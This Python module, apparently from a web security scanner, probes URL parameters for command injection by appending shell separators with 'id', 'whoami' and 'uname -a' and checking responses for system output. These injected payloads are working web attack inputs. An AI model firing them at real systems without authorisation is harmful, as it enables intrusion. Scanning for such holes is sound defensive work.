import subprocess, requests, random, string
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SEP = [";", "|", "&&", "||"]
CMDS = ["id", "whoami", "uname -a"]

def _inj(url, param, payload):
    p = urlparse(url)
    qs = parse_qs(p.query)
    qs[param] = qs[param][0] + payload
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


def scan(url, proxies=None, session=None, **kw):
    session = session or requests.Session()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return {"module": "CMDi", "vulnerable": False}

    findings = []
    vulnerable = False

    for p in params:
        for sep in SEP:
            for cmd in CMDS:
                payload = f"{sep}{cmd}"
                test_url = _inj(url, p, payload)
                try:
                    r = session.get(test_url, proxies=proxies, timeout=8, verify=False)
                    if "uid=" in r.text or "Linux" in r.text:
                        findings.append({"param": p, "payload": payload, "url": test_url})
                        vulnerable = True
                        raise StopIteration
                except Exception:
                    continue
            if vulnerable:
                break
        if vulnerable:
            break

    return {"module": "CMDi", "vulnerable": vulnerable, "findings": findings}
